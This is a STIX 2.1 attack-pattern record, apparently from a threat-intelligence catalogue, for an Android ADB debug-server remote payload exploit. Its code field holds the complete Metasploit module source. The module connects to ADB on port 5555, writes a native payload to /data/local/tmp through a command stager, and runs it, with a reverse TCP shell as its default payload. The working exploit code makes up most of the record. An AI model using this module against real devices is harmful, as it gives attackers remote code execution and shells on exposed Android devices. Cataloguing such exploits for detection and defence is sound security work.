{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7a133e3d-7e96-4d75-b61c-ebfdd23404ab",
    "created": "2024-08-14T16:35:11.626353Z",
    "modified": "2024-08-14T16:35:11.62636Z",
    "name": "Android ADB Debug Server Remote Payload Execution",
    "description": " Writes and spawns a native payload on an android device that is listening for adb debug messages. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/android/adb/adb_server_exec.rb",
            "external_id": "adb_server_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Android ADB Debug Server Remote Payload Execution',\n      'Description'    => %q{\n        Writes and spawns a native payload on an android device that is listening\n        for adb debug messages.\n      },\n      'Author'         => ['joev'],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'PAYLOAD' => 'linux/armle/shell_reverse_tcp' },\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_ARMLE, ARCH_X86, ARCH_X64, ARCH_MIPSLE],\n      'Targets'        => [\n        ['armle',  {'Arch' => ARCH_ARMLE}],\n        ['x86',    {'Arch' => ARCH_X86}],\n        ['x64',    {'Arch' => ARCH_X64}],\n        ['mipsle', {'Arch' => ARCH_MIPSLE}]\n      ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2016-01-01'\n    ))\n\n    register_options([\n      Opt::RPORT(5555),\n      OptString.new('WritableDir', [true, 'Writable directory', '/data/local/tmp/'])\n    ])\n  end\n\n  def check\n    setup_adb_connection do\n      device_info = @adb_client.connect.data\n      print_good \"Detected device:\\n#{device_info}\"\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def execute_command(cmd, opts)\n    response = @adb_client.exec_cmd(cmd)\n    print_good \"Command executed, response:\\n #{response}\"\n  end\n\n  def exploit\n    setup_adb_connection do\n      device_data = @adb_client.connect\n      print_good \"Connected to device:\\n#{device_data.data}\"\n      execute_cmdstager({\n        flavor: :echo,\n        enc_format: :octal,\n        prefix: '\\\\\\\\0',\n        temp: datastore['WritableDir'],\n        linemax: Rex::Proto::ADB::Message::Connect::DEFAULT_MAXDATA-8,\n        background: true,\n        nodelete: true\n      })\n    end\n  end\n\n  def setup_adb_connection(&blk)\n    begin\n      print_status \"Connecting to device...\"\n      connect\n      @adb_client = Rex::Proto::ADB::Client.new(sock)\n      blk.call\n    ensure\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-01-01",
    "x_mitre_platforms": [
        "linux'"
    ]
}